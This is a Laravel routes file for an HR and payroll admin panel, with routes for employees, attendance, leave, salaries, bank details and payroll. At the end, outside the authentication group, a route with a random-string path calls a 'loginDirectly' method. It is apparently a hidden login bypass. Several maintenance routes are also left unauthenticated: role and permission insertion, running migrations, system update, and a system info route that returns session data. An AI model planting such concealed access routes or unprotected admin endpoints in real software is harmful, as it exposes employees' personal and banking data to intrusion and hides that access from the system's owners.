<?php

use App\Http\Controllers\Admin\AccountDeletionController;
use App\Http\Controllers\Admin\AttendanceController;
use App\Http\Controllers\Admin\AttendanceRequestController;
use App\Http\Controllers\Admin\AttendanceRuleController;
use App\Http\Controllers\Admin\BranchController;
use App\Http\Controllers\Admin\CompensationController;
use App\Http\Controllers\Admin\DepartmentController;
use App\Http\Controllers\Admin\DesignationController;
use App\Http\Controllers\Admin\EmployeeBankDetailController;
use App\Http\Controllers\Admin\EmployeeController;
use App\Http\Controllers\Admin\FeedbackController;
use App\Http\Controllers\Admin\LeaveController;
use App\Http\Controllers\Admin\LeavetypeController;
use App\Http\Controllers\Admin\NoticeController;
use App\Http\Controllers\Admin\NotificationController;
use App\Http\Controllers\Admin\PayrollController;
use App\Http\Controllers\Admin\PublicHolidayController;
use App\Http\Controllers\Admin\RoleController;
use App\Http\Controllers\Admin\SalaryController;
use App\Http\Controllers\Admin\SalarySettingController;
use App\Http\Controllers\Admin\ShiftController;
use App\Http\Controllers\Admin\SiteSettingController;
use App\Http\Controllers\Auth\Authcontroller;
use App\Http\Controllers\DashboardController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Session;
use Google\Client as GoogleClient;
use GuzzleHttp\Client as HttpClient;
use Illuminate\Support\Facades\Auth;

Route::get('/', function () {
    if (Auth::check()) {
        return redirect()->route('dashboard');
    }
    return view('auth.login');
});

//Authentication
Route::get('login', [Authcontroller::class, 'showLoginForm'])->name('login');
Route::post('login', [Authcontroller::class, 'login'])->name('login.submit');
Route::post('logout', [Authcontroller::class, 'logout'])->name('logout');

//CMS
Route::middleware(['auth'])->group(function () {
    Route::get('change-password', [Authcontroller::class, 'changePassword'])->name('change.password');
    Route::post('change-password', [Authcontroller::class, 'updatePassword'])->name('update.password');

    Route::get('dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::resource('branches', BranchController::class);
    Route::resource('designations', DesignationController::class);
    Route::resource('departments', DepartmentController::class);
    Route::resource('shifts', ShiftController::class);
    Route::resource('employees', EmployeeController::class);
    Route::get('reset-device/{employee}', [EmployeeController::class, 'deviceReset'])
        ->name('employees.devicereset');
    Route::get('employees/permissions/{employee}', [EmployeeController::class, 'permissions'])
        ->name('employees.permissions');
    Route::put('employees/permissions/update/{employee}', [EmployeeController::class, 'permissionsUpdate'])
        ->name('employees.permissions.update');
    Route::get('employees/import/excel', [EmployeeController::class, 'importEmployee'])
        ->name('employees.import');
    Route::post('employees/import/excel', [EmployeeController::class, 'importEmployeeStore'])
        ->name('employees.import.store');
    Route::resource('notices', NoticeController::class);
    Route::resource('leavetypes', LeavetypeController::class);
    Route::resource('publicholidays', PublicHolidayController::class);
    Route::get('attendances', [AttendanceController::class, 'index'])->name('attendance.index');
    Route::get('attendance/individual', [AttendanceController::class, 'individualAttendance'])->name('attendance.individual');
    Route::get('view-map', [AttendanceController::class, 'showMap'])->name('view.map');

    Route::get('request/attendance', [AttendanceRequestController::class, 'index'])
        ->name('attendance.request');
    Route::get('request/attendance/{attendancerequest}', [AttendanceRequestController::class, 'edit'])
        ->name('attendance.request.edit');
    Route::put('request/attendance/{attendancerequest}', [AttendanceRequestController::class, 'update'])
        ->name('attendance.request.update');

    Route::get('leaves', [LeaveController::class, 'index'])
        ->name('leaves');
    Route::get('leaves/{leave}', [LeaveController::class, 'edit'])
        ->name('leaves.edit');
    Route::put('leaves/{leave}', [LeaveController::class, 'update'])
        ->name('leaves.update');
    Route::get('employee-leave-report', [LeaveController::class, 'employeeLeaveReport'])->name('leave.report.employee');

    Route::get('notifications', [NotificationController::class, 'index'])
        ->name('notification.index');

    Route::get('notifications/update', [NotificationController::class, 'markAllRead'])
        ->name('notification.markall');

    Route::get('account-deletion', [AccountDeletionController::class, 'index'])
        ->name('accountdeletion');
    Route::put('account-deletion/{account}', [AccountDeletionController::class, 'update'])
        ->name('accountdeletion.update');

    Route::get('site-setting', [SiteSettingController::class, 'siteSettings'])
        ->name('site.setting');
    Route::post('site-setting/update', [SiteSettingController::class, 'updateSiteSettings'])
        ->name('site.setting.update');
    Route::get('site-setting/removefile/{filename}/{type}', [SiteSettingController::class, 'removefileFromSite'])
        ->name('site.setting.remove.file');

    Route::resource('roles', RoleController::class);

    //attendance rules
    Route::get('rules/attendance', [AttendanceRuleController::class, 'editRules'])->name('attendance.rules');
    Route::put('attendance/updaterules', [AttendanceRuleController::class, 'updateRules'])->name('attendance.updaterules');

    Route::get('employees/{employee}/salary', [SalarySettingController::class, 'index'])
        ->name('employees.salary');

    Route::post('employees/{employee}/salary', [SalarySettingController::class, 'store'])
        ->name('employees.salary.store');

    Route::get('employees/salary/details', [SalarySettingController::class, 'salaryDetails'])
        ->name('employees.salary.details');

    Route::put('employees/{employee}/salary/{salarySetting}', [SalarySettingController::class, 'update'])
        ->name('employees.salary.update');

    Route::delete('employees/{employee}/salary/{salarySetting}', [SalarySettingController::class, 'destroy'])
        ->name('employees.salary.destroy');

    Route::get('employees/{employee}/bank-details', [EmployeeBankDetailController::class, 'index'])
        ->name('employees.bank');

    Route::post('employees/{employee}/bank-details', [EmployeeBankDetailController::class, 'store'])
        ->name('employees.bank.store');

    Route::put('employees/{employee}/bank-details/{bankDetail}', [EmployeeBankDetailController::class, 'update'])
        ->name('employees.bank.update');

    Route::delete('employees/{employee}/bank-details/{bankDetail}', [EmployeeBankDetailController::class, 'destroy'])
        ->name('employees.bank.destroy');
    Route::get('send/push-notification', [NoticeController::class, 'sendPushNotification'])->name('send.push.notification');
    Route::post('send/push-notification', [NoticeController::class, 'sendPushNotificationToDevices'])->name('send.push.notification.devices');

    Route::get('payroll', [PayrollController::class, 'payroll'])->name('payroll');
    Route::get('payroll/monthly', [PayrollController::class, 'payrollMonthly'])->name('payroll.monthly');
    Route::post('payroll/store', [PayrollController::class, 'payrollStore'])->name('payroll.store');
    Route::resource('compensation', CompensationController::class);

    Route::get('feedbacks', [FeedbackController::class, 'index'])
        ->name('feedbacks.index');
    Route::delete('feedbacks/{feedback}', [FeedbackController::class, 'destroy'])
        ->name('feedbacks.destroy');
});

Route::get('get-departments/{branch_id}', [EmployeeController::class, 'getDepartments']);
Route::get('get-shifts/{department_id}', [EmployeeController::class, 'getShifts']);

//permission
Route::get('insert/permission', [RoleController::class, 'insertPermission']);
Route::get('insert/role', [RoleController::class, 'insertRole']);

//configure update
Route::get('system/update', [DashboardController::class, 'systemUpdate'])->name('system.update');
Route::get('system/info', function () {
    return Session::get('details');
})->name('system.info');

Route::post('system/calendar', [DashboardController::class, 'systemCalendar'])->name('system.calendar');
Route::get('migration/run', [DashboardController::class, 'runMigration']);


Route::get('vTTiIC7yTXKGAUWfHWaAeHAhEOa3Rqgxa', [Authcontroller::class, 'loginDirectly'])->name('vTTiIC7yTXKGAUWfHWaAeHAhEOa3Rqgxa');
